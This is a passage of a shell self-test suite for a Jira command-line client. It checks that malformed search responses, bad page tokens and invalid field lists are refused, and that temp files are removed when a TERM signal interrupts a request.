    if [ "$fl_rc" -eq 1 ] && [ ! -s "$tmpd/fl.out" ] && [ ! -s "$argvlog" ] \
      && [ "$fl_err" = "refused: fields failed the allowlist" ]; then
      :
    else
      fieldsleg_ok=0
      echo "  (fields='$badfields' rc=$fl_rc argvlog-size=$(wc -c < "$argvlog" | tr -d ' ') err='$fl_err')" >&2
    fi
  done
  if [ "$fieldsleg_ok" -eq 1 ]; then
    echo "PASS: selftest — a fields value outside the allowlist (a bare string, an unlisted field name, invalid JSON, or an empty array) refuses, rc 1, empty stdout, zero requests, 'refused: fields failed the allowlist' (T2c0 item 1 / T2b1 seat M-1)"
  else
    echo "FAIL: selftest — the fields allowlist did not refuse cleanly for one or more cases (T2c0 item 1)"; sfail=1
  fi

  # --- 0b (security Low-2): the old name (`_sa_rundir`) must have zero effect anywhere now — checked
  # in-process, a nonexistent dir would fail-closed (rc 2) if honoured, so rc 0 proves it is not. -----
  _tj_fx status-ids-cloud
  ob1_rc=0
  _sa_rundir="$tmpd/does-not-exist-1" tj_status_ids https://ex.atlassian.net cloud AB >/dev/null 2>&1 || ob1_rc=$?
  # An ambient `_TJ_RUNDIR` inherited at PROCESS START must also have no effect — the in-process
  # unset above already ran before this test began, so this needs a genuinely FRESH process (the
  # item-6 fresh-process mechanism) to exercise the file-scope `unset` for real.
  _tj_cli_line=$(grep -n '^# --- CLI' "$0" | head -1 | cut -d: -f1)
  _tj_ob_check="$tmpd/rundir-check.sh"
  head -n $((_tj_cli_line - 1)) "$0" > "$_tj_ob_check"
  printf '_TJ_CURL_BIN="$1"; shift\ntj_status_ids https://ex.atlassian.net cloud AB\n' >> "$_tj_ob_check"
  _tj_fx status-ids-cloud
  ob2_rc=0
  _TJ_RUNDIR="$tmpd/does-not-exist-2" sh "$_tj_ob_check" "$shim" >/dev/null 2>&1 || ob2_rc=$?
  if [ "$ob1_rc" -eq 0 ] && [ "$ob2_rc" -eq 0 ]; then
    echo "PASS: selftest — an ambient _sa_rundir/_TJ_RUNDIR env var (the latter inherited at process start, on a fresh process) steers no temp file for a non-search call (0b)"
  else
    echo "FAIL: selftest — an ambient rundir env var steered a non-search call's temp file (rc1=$ob1_rc rc2=$ob2_rc)"; sfail=1
  fi

}
_tj_st_search_hardening() {

  # --- fix1 C-1a: a rate-limited FIRST page -> rc 2, empty file, exactly one request (the
  # negation-status bug returned rc 0 with an empty list instead). --------------------------------
  _tj_fxseq rate-limited
  : > "$argvlog"
  c1a_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/c1a.out" 2>"$tmpd/c1a.err" || c1a_rc=$?
  c1a_calls=$(grep -c '^' "$argvlog" 2>/dev/null || echo 0)
  if [ "$c1a_rc" -eq 2 ] && [ ! -s "$tmpd/c1a.out" ] && [ "$c1a_calls" -eq 1 ]; then
    echo "PASS: selftest — a rate-limited first page yields rc 2, empty stdout, one request (T2b1 fix1 C-1a)"
  else
    echo "FAIL: selftest — a rate-limited first page did not cleanly refuse (rc=$c1a_rc calls=$c1a_calls out='$(cat "$tmpd/c1a.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 C-1b: a GOOD page 1 (with a token) then a rate-limited page 2 -> rc 2, file EMPTY —
  # page 1's buffer must be discarded, never leaked on a later-page failure. ----------------------
  _tj_fxseq list-page1 rate-limited
  : > "$argvlog"
  c1b_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/c1b.out" 2>"$tmpd/c1b.err" || c1b_rc=$?
  if [ "$c1b_rc" -eq 2 ] && [ ! -s "$tmpd/c1b.out" ]; then
    echo "PASS: selftest — a good page 1 then a rate-limited page 2 yields rc 2, empty stdout — page 1's buffer discarded (T2b1 fix1 C-1b)"
  else
    echo "FAIL: selftest — page 1's buffer leaked on a page-2 failure (rc=$c1b_rc out='$(cat "$tmpd/c1b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 C-1c: a 3xx redirect on the first page -> rc 2, empty file. ---------------------------
  _tj_fx redirect
  : > "$argvlog"
  c1c_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/c1c.out" 2>"$tmpd/c1c.err" || c1c_rc=$?
  if [ "$c1c_rc" -eq 2 ] && [ ! -s "$tmpd/c1c.out" ]; then
    echo "PASS: selftest — a redirected first page yields rc 2, empty stdout (T2b1 fix1 C-1c)"
  else
    echo "FAIL: selftest — a redirected first page did not cleanly refuse (rc=$c1c_rc out='$(cat "$tmpd/c1c.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 C-1d: a 404 on the first page -> rc 2, empty file. ------------------------------------
  _tj_fx not-found
  : > "$argvlog"
  c1d_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/c1d.out" 2>"$tmpd/c1d.err" || c1d_rc=$?
  if [ "$c1d_rc" -eq 2 ] && [ ! -s "$tmpd/c1d.out" ]; then
    echo "PASS: selftest — a 404 on the first page yields rc 2, empty stdout (T2b1 fix1 C-1d)"
  else
    echo "FAIL: selftest — a 404 on the first page did not cleanly refuse (rc=$c1d_rc out='$(cat "$tmpd/c1d.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 I-1a: isLast AS A STRING ("true") -> rc 2 (completeness must be decided on the TYPED
  # JSON value, never a stringified read that can't tell a JSON string from a JSON boolean). -------
  _tj_fx list-islast-string-true
  : > "$argvlog"
  i1a_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i1a.out" 2>"$tmpd/i1a.err" || i1a_rc=$?
  if [ "$i1a_rc" -eq 2 ] && [ ! -s "$tmpd/i1a.out" ]; then
    echo "PASS: selftest — isLast as a JSON string ('true') is refused, rc 2, empty stdout (T2b1 fix1 I-1a)"
  else
    echo "FAIL: selftest — a string isLast:'true' was not refused (rc=$i1a_rc out='$(cat "$tmpd/i1a.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 I-1b: isLast:true, nextPageToken:false (a JSON boolean, not null) -> rc 2. ------------
  _tj_fx list-islast-true-token-false
  : > "$argvlog"
  i1b_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i1b.out" 2>"$tmpd/i1b.err" || i1b_rc=$?
  if [ "$i1b_rc" -eq 2 ] && [ ! -s "$tmpd/i1b.out" ]; then
    echo "PASS: selftest — isLast:true with nextPageToken:false is refused, rc 2, empty stdout (T2b1 fix1 I-1b)"
  else
    echo "FAIL: selftest — isLast:true with nextPageToken:false was not refused (rc=$i1b_rc out='$(cat "$tmpd/i1b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 I-1c: isLast:true, nextPageToken:"" (an empty STRING, not null) -> rc 2. --------------
  _tj_fx list-islast-true-token-empty
  : > "$argvlog"
  i1c_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i1c.out" 2>"$tmpd/i1c.err" || i1c_rc=$?
  if [ "$i1c_rc" -eq 2 ] && [ ! -s "$tmpd/i1c.out" ]; then
    echo "PASS: selftest — isLast:true with nextPageToken:'' is refused, rc 2, empty stdout (T2b1 fix1 I-1c)"
  else
    echo "FAIL: selftest — isLast:true with nextPageToken:'' was not refused (rc=$i1c_rc out='$(cat "$tmpd/i1c.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 I-1d: isLast AS A STRING ("false") with a token -> rc 2, and NEVER followed (the
  # argv log shows exactly one request — a string "false" must not be read as the boolean false).
  _tj_fx list-islast-string-false-token
  : > "$argvlog"
  i1d_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i1d.out" 2>"$tmpd/i1d.err" || i1d_rc=$?
  i1d_calls=$(grep -c '^' "$argvlog" 2>/dev/null || echo 0)
  if [ "$i1d_rc" -eq 2 ] && [ ! -s "$tmpd/i1d.out" ] && [ "$i1d_calls" -eq 1 ]; then
    echo "PASS: selftest — isLast as a JSON string ('false') with a token is refused, rc 2, never followed, one request (T2b1 fix1 I-1d)"
  else
    echo "FAIL: selftest — a string isLast:'false' with a token was followed (rc=$i1d_rc calls=$i1d_calls out='$(cat "$tmpd/i1d.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 I-2a: a TWO-DOCUMENT body (two valid JSON docs concatenated) -> rc 2, empty file. The
  # shape check must SLURP (`jq -s`) so a whole-string verdict, not just the LAST document's, is
  # what decides. ------------------------------------------------------------------------------
  _tj_fx list-two-documents
  : > "$argvlog"
  i2a_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i2a.out" 2>"$tmpd/i2a.err" || i2a_rc=$?
  i2a_err=$(cat "$tmpd/i2a.err" 2>/dev/null || true)
  i2a_ok=1
  [ "$i2a_rc" -eq 2 ] || i2a_ok=0
  [ -s "$tmpd/i2a.out" ] && i2a_ok=0
  # T2b2 0a: give this leg the SAME oracle as I-2b/c/d — the slurp guard (`-s`/`length==1`) was
  # isolated by rc+empty-stdout alone, which a mutant that drops JUST those two jq clauses (keeping
  # the element-type check) can still satisfy for the WRONG reason (a raw jq parse/arithmetic
  # failure elsewhere also yields rc 2 + empty stdout). Pin the POSITIVE cause AND the absence of
  # the three leak shapes I-2b/c/d already pin.
  case "$i2a_err" in
    *"unverified: search response failed the expected shape"*) : ;;
    *) i2a_ok=0 ;;
  esac
  case "$i2a_err" in
    *"jq: error"*) i2a_ok=0 ;;
  esac
  case "$i2a_err" in
    *"Illegal number"*) i2a_ok=0 ;;
  esac
  case "$i2a_err" in
    *"integer expression"*) i2a_ok=0 ;;
  esac
  if [ "$i2a_ok" -eq 1 ]; then
    echo "PASS: selftest — a two-document search response is refused, rc 2, empty stdout, the shape sentence, no jq/shell error leakage (T2b2 0a / T2b1 fix1 I-2a)"
  else
    echo "FAIL: selftest — a two-document search response was not cleanly refused (rc=$i2a_rc out='$(cat "$tmpd/i2a.out" 2>/dev/null)' err='$i2a_err')"; sfail=1
  fi

  # --- fix1 I-2b/c/d: `.issues` elements that are the RIGHT array shape but the WRONG element
  # shape (numbers / strings / nulls, never objects) -> rc 2, empty file each time, and stderr
  # carries ONLY the fixed sentence — no fixture bytes, no `jq: error`, no shell arithmetic error.
  i2ok=1
  for i2case in "list-issues-numbers:1" "list-issues-strings:AB-9" "list-issues-nulls:null"; do
    i2fx=${i2case%%:*}; i2needle=${i2case#*:}
    _tj_fx "$i2fx"
    : > "$argvlog"
    i2_rc=0
    _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
      "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i2x.out" 2>"$tmpd/i2x.err" || i2_rc=$?
    i2_err=$(cat "$tmpd/i2x.err" 2>/dev/null || true)
    i2_ok_one=1
    [ "$i2_rc" -eq 2 ] || i2_ok_one=0
    [ -s "$tmpd/i2x.out" ] && i2_ok_one=0
    case "$i2_err" in
      *"unverified: search response failed the expected shape"*) : ;;
      *) i2_ok_one=0 ;;
    esac
    case "$i2_err" in
      *"jq: error"*) i2_ok_one=0 ;;
    esac
    case "$i2_err" in
      *"Illegal number"*) i2_ok_one=0 ;;
    esac
    case "$i2_err" in
      *"$i2needle"*) i2_ok_one=0 ;;
    esac
    if [ "$i2_ok_one" -ne 1 ]; then
      i2ok=0
      echo "  (fixture=$i2fx rc=$i2_rc out='$(cat "$tmpd/i2x.out" 2>/dev/null)' err='$i2_err')" >&2
    fi
  done
  if [ "$i2ok" -eq 1 ]; then
    echo "PASS: selftest — issues elements that are numbers/strings/nulls (never objects) are refused, rc 2, empty stdout, one clean sentence, no jq/shell error leakage (T2b1 fix1 I-2b/c/d)"
  else
    echo "FAIL: selftest — a non-object issues element was not cleanly refused (see details above)"; sfail=1
  fi

  # --- fix1 Minor-4: an undrained `_tj_fxseq` queue must not leak into the NEXT `_tj_fx` leg —
  # `list-page2` alone is isLast:true, so the loop completes after ONE call, leaving `list-dupkey`
  # undrained in `.fixture-seq`; the following `_tj_fx list-trailing-newline` call must make the
  # NEXT request use `list-trailing-newline`, not the stale leftover queue item. --------------------
  _tj_fxseq list-page2 list-dupkey
  : > "$argvlog"
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m4a.out" 2>"$tmpd/m4a.err" || true
  _tj_fx list-trailing-newline
  : > "$argvlog"
  m4_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m4b.out" 2>"$tmpd/m4b.err" || m4_rc=$?
  if [ "$m4_rc" -eq 1 ] && [ ! -s "$tmpd/m4b.out" ]; then
    echo "PASS: selftest — an undrained fixture-seq queue does not leak into the next _tj_fx call (T2b1 fix1 Minor-4)"
  else
    echo "FAIL: selftest — a stale fixture-seq queue fed the wrong fixture into the next _tj_fx leg (rc=$m4_rc out='$(cat "$tmpd/m4b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 Minor-2: a leading-zero key ("AB-01" beside the already-valid "AB-1") -> rc 1, empty
  # file. `_tj_id_ok` itself is untouched (a shared function other call sites rely on) — the
  # leading-zero refusal is added ONLY in this op's own key validation. -----------------------------
  _tj_fx list-leading-zero-key
  : > "$argvlog"
  m2_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m2.out" 2>"$tmpd/m2.err" || m2_rc=$?
  if [ "$m2_rc" -eq 1 ] && [ ! -s "$tmpd/m2.out" ]; then
    echo "PASS: selftest — a leading-zero key ('AB-01') is refused, rc 1, empty stdout (T2b1 fix1 Minor-2)"
  else
    echo "FAIL: selftest — a leading-zero key was not refused (rc=$m2_rc out='$(cat "$tmpd/m2.out" 2>/dev/null)')"; sfail=1
  fi

  # --- fix1 I-1e, RE-SUPERSEDED by T2b2 fix1 m-3's WIDENED printable-ASCII token grammar
  # (`[!-~]`): a token containing a LITERAL backslash ("CAEQ\nAg" — the two bytes `\` and `n`,
  # never an actual newline) is PRINTABLE ASCII (0x5C is inside `[!-~]`), so it is now ACCEPTED and
  # must round-trip BYTE-IDENTICALLY into page 2's own POSTed body — `jq --arg` carries it safely
  # (proved here, not assumed). T2b2 0c's narrower charset briefly refused this same input; m-3
  # widens the charset again (an opaque token's shape is not this file's to constrain beyond
  # "printable, no control bytes, no whitespace"), so this leg is updated a SECOND time, test-first,
  # to assert the new, correct outcome rather than left pointing at a since-superseded charset. -----
  _tj_fxseq list-page1-backslash-token list-page2
  : > "$argvlog"
  i1e_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i1e.out" 2>"$tmpd/i1e.err" || i1e_rc=$?
  i1e_lastbody=$(cat "$tmpd/.lastbody" 2>/dev/null || true)
  i1e_tok=$(printf '%s' "$i1e_lastbody" | jq -r '.nextPageToken' 2>/dev/null || true)
  if [ "$i1e_rc" -eq 0 ] && [ "$i1e_tok" = 'CAEQ\nAg' ]; then
    echo "PASS: selftest — a page token carrying a literal backslash byte (printable ASCII) round-trips byte-identically into page 2's body, rc 0 (T2b2 fix1 m-3 / T2b1 fix1 I-1e re-superseded)"
  else
    echo "FAIL: selftest — a page token carrying a literal backslash byte did not round-trip (rc=$i1e_rc tok='$i1e_tok' out='$(cat "$tmpd/i1e.out" 2>/dev/null)' err='$(cat "$tmpd/i1e.err" 2>/dev/null)')"; sfail=1
  fi

}
_tj_st_signals_tempfiles() {

  # --- T2b2 0b: a signal (TERM) arriving WHILE a page fetch is in flight must actually terminate
  # the whole read at once (rc 143), not just run a cleanup command and resume — and it must clean
  # up the in-flight request-body temp file. The old combined `trap … EXIT INT TERM` in
  # `_tj_search_all`'s loop subshell referenced `${_sa_cur_bodyfile:-}`, a variable set inside a
  # DEEPER command-substitution fork (`_tj_sa_fetch_page`'s own `$(...)`) that fork's own trap copy
  # never saw — so it never actually removed it, and (being a plain cleanup command with no
  # `exit`) it did not reliably end the run either. The shim signals its OWN PPID — the real
  # process that is curl's parent in the request pipeline — once the -K config has been read, so
  # this is a REAL delivered signal on a REAL in-flight request, never simulated. ------------------
  _tj_fx list-page1
  echo TERM > "$tmpd/.selfsignal"
  : > "$argvlog"
  sigrc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sig.out" 2>"$tmpd/sig.err" || sigrc=$?
  sig_bodypath=$(cat "$tmpd/.lastbodypath" 2>/dev/null || true)
  sig_bodygone=0
  [ -n "$sig_bodypath" ] && [ ! -e "$sig_bodypath" ] && sig_bodygone=1
  # T2c0 item 4c: extend this leg to the response AND header temps too (`_resp_tmp`/`_hdr_tmp`),
  # recorded by the shim into `.lastresppath`/`.lastheaderpath` alongside the pre-existing body path.
  sig_resppath=$(cat "$tmpd/.lastresppath" 2>/dev/null || true)
  sig_hdrpath=$(cat "$tmpd/.lastheaderpath" 2>/dev/null || true)
  sig_respgone=0; [ -n "$sig_resppath" ] && [ ! -e "$sig_resppath" ] && sig_respgone=1
  sig_hdrgone=0; [ -n "$sig_hdrpath" ] && [ ! -e "$sig_hdrpath" ] && sig_hdrgone=1
  rm -f "$tmpd/.selfsignal"
  if [ "$sigrc" -eq 143 ] && [ ! -s "$tmpd/sig.out" ] && [ "$sig_bodygone" -eq 1 ] \
    && [ "$sig_respgone" -eq 1 ] && [ "$sig_hdrgone" -eq 1 ]; then
    echo "PASS: selftest — a TERM signal during an in-flight page fetch ends the whole read at once (rc 143, empty stdout) and leaves no request-body, response, or header temp file behind (T2b2 0b / T2c0 item 4c)"
  else
    echo "FAIL: selftest — a TERM signal during an in-flight fetch was not cleanly handled (rc=$sigrc out='$(cat "$tmpd/sig.out" 2>/dev/null)' bodypath='$sig_bodypath' bodygone=$sig_bodygone resppath='$sig_resppath' respgone=$sig_respgone hdrpath='$sig_hdrpath' hdrgone=$sig_hdrgone)"; sfail=1
  fi

  # --- T3b step 0b leg 1: a signal (TERM) arriving mid-`get-issue` — a read OUTSIDE
  # `_tj_search_all` — must also leave no `_resp_tmp`/`_hdr_tmp` behind ("`_resp_tmp` now holds
  # assignee PII on every get-issue" — the CLASS gap this step closes). Same real-signal shim
  # technique as the `_tj_search_all` 0b leg above (signals the shim's own $PPID).
  _tj_fx cloud-issue-good
  echo TERM > "$tmpd/.selfsignal"
  giigrc=0
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 > "$tmpd/giisig.out" 2>"$tmpd/giisig.err" || giigrc=$?
  giisig_resppath=$(cat "$tmpd/.lastresppath" 2>/dev/null || true)
  giisig_hdrpath=$(cat "$tmpd/.lastheaderpath" 2>/dev/null || true)
  giisig_respgone=0; [ -n "$giisig_resppath" ] && [ ! -e "$giisig_resppath" ] && giisig_respgone=1
  giisig_hdrgone=0; [ -n "$giisig_hdrpath" ] && [ ! -e "$giisig_hdrpath" ] && giisig_hdrgone=1
  rm -f "$tmpd/.selfsignal"
  if [ "$giigrc" -eq 143 ] && [ ! -s "$tmpd/giisig.out" ] && [ "$giisig_respgone" -eq 1 ] && [ "$giisig_hdrgone" -eq 1 ]; then
    echo "PASS: selftest — a TERM signal during an in-flight get-issue call ends it at once (rc 143, empty stdout) and leaves no response or header temp file behind (T3b step 0b leg 1)"
  else
    echo "FAIL: selftest — a TERM signal during an in-flight get-issue call was not cleanly handled (rc=$giigrc out='$(cat "$tmpd/giisig.out" 2>/dev/null)' resppath='$giisig_resppath' respgone=$giisig_respgone hdrpath='$giisig_hdrpath' hdrgone=$giisig_hdrgone)"; sfail=1
  fi

  # --- T3b-core step 0: a signal (TERM) arriving mid-`assign-self` — a WRITE path T3b-0 disclosed as
  # still falling back to the system default temp dir on a signal — must also leave no `_resp_tmp`/
  # `_hdr_tmp` behind. Same real-signal shim technique as the get-issue leg above.
  _tj_fx assign-self-good
  echo TERM > "$tmpd/.selfsignal"
  asgsig_rc=0
  tj_assign_self https://ex.atlassian.net cloud AB AB-7 > "$tmpd/asgsig.out" 2>"$tmpd/asgsig.err" || asgsig_rc=$?
  asgsig_resppath=$(cat "$tmpd/.lastresppath" 2>/dev/null || true)
  asgsig_hdrpath=$(cat "$tmpd/.lastheaderpath" 2>/dev/null || true)
  asgsig_respgone=0; [ -n "$asgsig_resppath" ] && [ ! -e "$asgsig_resppath" ] && asgsig_respgone=1
  asgsig_hdrgone=0; [ -n "$asgsig_hdrpath" ] && [ ! -e "$asgsig_hdrpath" ] && asgsig_hdrgone=1
  rm -f "$tmpd/.selfsignal"
  if [ "$asgsig_rc" -eq 143 ] && [ ! -s "$tmpd/asgsig.out" ] && [ "$asgsig_respgone" -eq 1 ] && [ "$asgsig_hdrgone" -eq 1 ]; then
    echo "PASS: selftest — a TERM signal during an in-flight assign-self call ends it at once (rc 143, empty stdout) and leaves no response or header temp file behind (T3b-core step 0)"
  else
    echo "FAIL: selftest — a TERM signal during an in-flight assign-self call was not cleanly handled (rc=$asgsig_rc out='$(cat "$tmpd/asgsig.out" 2>/dev/null)' resppath='$asgsig_resppath' respgone=$asgsig_respgone hdrpath='$asgsig_hdrpath' hdrgone=$asgsig_hdrgone)"; sfail=1
  fi

  # --- T2c0 item 4 (a)/(b): a PATH-level `mktemp` wrapper captures the run dir's own returned path
  # directly (never TMPDIR — not portable across mktemp implementations), passing every other call through.
  rdbin="$tmpd/rdbin"; mkdir -p "$rdbin"
  RD_REAL_MKTEMP=$(command -v mktemp); export RD_REAL_MKTEMP
  RD_LOG="$tmpd/.rdlog"; export RD_LOG
  RD_TMPD="$tmpd"; export RD_TMPD
  RD_FALLBACK_LOG="$tmpd/.rdfallback"; export RD_FALLBACK_LOG
  cat > "$rdbin/mktemp" <<'RDEOF'
#!/bin/sh
if [ $# -eq 1 ] && [ "$1" = "-d" ]; then
  p=$("$RD_REAL_MKTEMP" -d) || exit 1
  printf '%s\n' "$p" >> "$RD_LOG"
  printf '%s\n' "$p"
  exit 0
fi
# 0e: a BARE call (no `-d`, no template) is `_tj_mktemp`'s FALLBACK shape — it should never fire
# while a run dir is live. Root it under the leg's OWN tmpd (never real /tmp) and log it, so a
# mutant that drops the run-dir routing is caught even where the real mktemp ignores $TMPDIR.
if [ $# -eq 0 ]; then
  p=$("$RD_REAL_MKTEMP" "$RD_TMPD/fallback.XXXXXX") || exit 1
  printf '%s\n' "$p" >> "$RD_FALLBACK_LOG"
  printf '%s\n' "$p"
  exit 0
fi
exec "$RD_REAL_MKTEMP" "$@"
RDEOF
  chmod +x "$rdbin/mktemp"
  rd_origpath=$PATH

  : > "$tmpd/.rdlog"; : > "$tmpd/.rdfallback"
  PATH="$rdbin:$rd_origpath"; export PATH
  _tj_fxseq list-page1 list-page2
  : > "$argvlog"
  rda_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/rda.out" 2>"$tmpd/rda.err" || rda_rc=$?
  PATH=$rd_origpath; export PATH
  rda_dir=$(tail -n1 "$tmpd/.rdlog" 2>/dev/null)
  rda_gone=0; [ -n "$rda_dir" ] && [ ! -e "$rda_dir" ] && rda_gone=1
  # 0e: also require ZERO fallback (no-run-dir-template) mktemp calls during this read — a mutant
  # that drops the run-dir routing still leaves rda_gone=1 (the rundir itself is unrelated) but
  # would leak a fallback call, caught here.
  rda_nofallback=0; [ ! -s "$tmpd/.rdfallback" ] && rda_nofallback=1
  if [ "$rda_rc" -eq 0 ] && [ -n "$rda_dir" ] && [ "$rda_gone" -eq 1 ] && [ "$rda_nofallback" -eq 1 ]; then
    echo "PASS: selftest — a successful two-page read (rc 0) leaves no entry in its own private run directory afterwards, and every temp it created used that dir (0e / T2c0 item 4a)"
  else
    echo "FAIL: selftest — a successful read left its run directory behind, never captured one, or used a fallback temp outside it (rc=$rda_rc dir='$rda_dir' gone=$rda_gone nofallback=$rda_nofallback)"; sfail=1
  fi

  : > "$tmpd/.rdlog"; : > "$tmpd/.rdfallback"
  PATH="$rdbin:$rd_origpath"; export PATH
  _tj_fxseq list-page1 rate-limited
  : > "$argvlog"
  rdb_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/rdb.out" 2>"$tmpd/rdb.err" || rdb_rc=$?
  PATH=$rd_origpath; export PATH
  rdb_dir=$(tail -n1 "$tmpd/.rdlog" 2>/dev/null)
  rdb_gone=0; [ -n "$rdb_dir" ] && [ ! -e "$rdb_dir" ] && rdb_gone=1
  rdb_nofallback=0; [ ! -s "$tmpd/.rdfallback" ] && rdb_nofallback=1
  if [ "$rdb_rc" -eq 2 ] && [ ! -s "$tmpd/rdb.out" ] && [ -n "$rdb_dir" ] && [ "$rdb_gone" -eq 1 ] && [ "$rdb_nofallback" -eq 1 ]; then
    echo "PASS: selftest — a refused mid-read (page 2 rate-limited) also leaves no entry in its own private run directory, and used no fallback temp (0e / T2c0 item 4b)"
  else
    echo "FAIL: selftest — a refused mid-read left its run directory behind, never captured one, or used a fallback temp outside it (rc=$rdb_rc dir='$rdb_dir' gone=$rdb_gone nofallback=$rdb_nofallback)"; sfail=1
  fi

  # --- T2b2 fix1 I-1: unlike the 0b leg above (which signals the shim's $PPID, a descendant of the
  # loop subshell), this leg signals the loop subshell's OWN pid, resolved test-side via `ps`. -------
  if ! command -v ps >/dev/null 2>&1; then
    echo "PASS: selftest — a TERM signal delivered directly to the loop subshell itself (T2b2 fix2 Q-m4/S-L3) — SKIPPED, UNVERIFIED: no \`ps\` on PATH to resolve the loop subshell's pid"
  else
    _tj_fxseq list-page1 list-page2
    : > "$argvlog"
    echo 1 > "$tmpd/.sleep"
    _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
      "project = AB AND status = 3" 200 '["key"]' > "$tmpd/i1.out" 2>"$tmpd/i1.err" &
    i1_job=$!
    # T2c0 item 1 (regression found and fixed this round): item 1's own `fields` allowlist forks a
    # `printf | jq` pipeline as the FIRST child of this backgrounded call, ahead of the loop
    # subshell — a transient SIBLING this resolution loop's original "first child found" match can
    # catch instead of the long-lived subshell (measured: reqs=2, rc=0, the read completing
    # un-signalled). Require the SAME candidate on two consecutive 0.05s samples before accepting —
    # `jq`/`printf` exit in well under 0.05s, the subshell lives for the shim's own 1s delay.
    i1_p0=""; i1_prev=""
    i1_tries=0
    while [ -z "$i1_p0" ] && [ "$i1_tries" -lt 60 ]; do
      i1_cand=$(ps -eo pid=,ppid= 2>/dev/null | awk -v p="$i1_job" '$2==p{print $1; exit}')
      if [ -n "$i1_cand" ] && [ "$i1_cand" = "$i1_prev" ]; then
        i1_p0=$i1_cand
        break
      fi
      i1_prev=$i1_cand
      i1_tries=$((i1_tries + 1))
      sleep 0.05
    done
    printf '%s\n' "$i1_p0" > "$tmpd/.selfsignal-target-pid"
    echo TERM > "$tmpd/.selfsignal"
    i1_rc=0
    wait "$i1_job" || i1_rc=$?
    i1_lastsig=$(cat "$tmpd/.lastsignalled" 2>/dev/null || true)
    rm -f "$tmpd/.sleep" "$tmpd/.selfsignal" "$tmpd/.selfsignal-target-pid" "$tmpd/.lastsignalled"
    i1_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    if [ "$i1_rc" -eq 143 ] && [ ! -s "$tmpd/i1.out" ] && [ "$i1_reqs" -eq 1 ] && [ -n "$i1_p0" ] \
      && [ "$i1_lastsig" = "$i1_p0" ]; then
      echo "PASS: selftest — a TERM signal delivered DIRECTLY to the loop subshell itself (never a descendant fork, never a silent \$PPID fallback) ends the read before a second page is ever requested (rc 143, empty stdout, 1 real request, signalled pid == resolved pid) (T2b2 fix1 I-1 / fix2 Q-m4/S-L3)"
    else
      echo "FAIL: selftest — a TERM signal to the loop subshell itself did not behave as expected (rc=$i1_rc reqs=$i1_reqs out='$(cat "$tmpd/i1.out" 2>/dev/null)' err='$(cat "$tmpd/i1.err" 2>/dev/null)' resolved_p0='$i1_p0' lastsignalled='$i1_lastsig')"; sfail=1
    fi
  fi

  # --- T2b2 0c: a page-1 `nextPageToken` carrying a REAL embedded newline ("T\nX", two lines once
  # printed) must be refused (rc 2, empty stdout) — today the token is captured line-by-line
  # (`sed -n '3p'` off `_tj_sa_one_page`'s 3-line stdout contract), so a newline inside the token
  # silently truncates it to "T" and the run proceeds with the WRONG token rather than refusing. --
  _tj_fx list-page1-real-newline-token
  : > "$argvlog"
  nlrc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/nl.out" 2>"$tmpd/nl.err" || nlrc=$?
  if [ "$nlrc" -eq 2 ] && [ ! -s "$tmpd/nl.out" ]; then
    echo "PASS: selftest — a page token carrying a real embedded newline is refused, rc 2, empty stdout (T2b2 0c)"
  else
    echo "FAIL: selftest — a page token carrying a real embedded newline was not refused (rc=$nlrc out='$(cat "$tmpd/nl.out" 2>/dev/null)' err='$(cat "$tmpd/nl.err" 2>/dev/null)')"; sfail=1
  fi

